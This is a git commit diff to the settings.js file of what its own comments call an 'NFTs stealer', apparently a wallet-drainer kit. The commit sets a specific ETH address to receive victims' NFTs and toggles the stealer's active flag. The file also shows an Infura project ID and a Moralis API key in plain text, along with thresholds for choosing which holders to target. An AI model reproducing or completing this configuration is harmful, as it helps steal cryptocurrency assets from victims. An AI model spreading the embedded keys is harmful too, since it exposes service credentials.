34fc09c69bd5b0ddac80ead23a043454c225860c
nonfungiblesolana <103703809+nonfungiblesolana@users.noreply.github.com>
2022-06-28 12:48:55 +0200

    update

--- settings.js
+++ settings.js
@@ -1,5 +1,5 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "YOUR WALLET";    // Your ETH wallet that you have to receive NFTs
+const address = "0x28f630de17c2372b21Eb58b3F83b8215BAE85007";    // Your ETH wallet that you have to receive NFTs
 const infuraId = "52cf9376ca0149889215a557c6ef7c53"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "UFZFSHwkweXCj3FHGZHXxFITwXNVYgMog2wk5kq60hpmR2HFUxKt8Rz1uZQmbkE2"    // Web3 Api key | https://moralis.io/ | For NFTs
 
@@ -31,7 +31,7 @@ const mintInfo = {
 }
 
 const nftsInfo = {
-    active: true,   // Active (true) or not (false) NFTs stealer.
+    active: false,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
     receiveAddress: "" // leave empty if you want to use the same address 
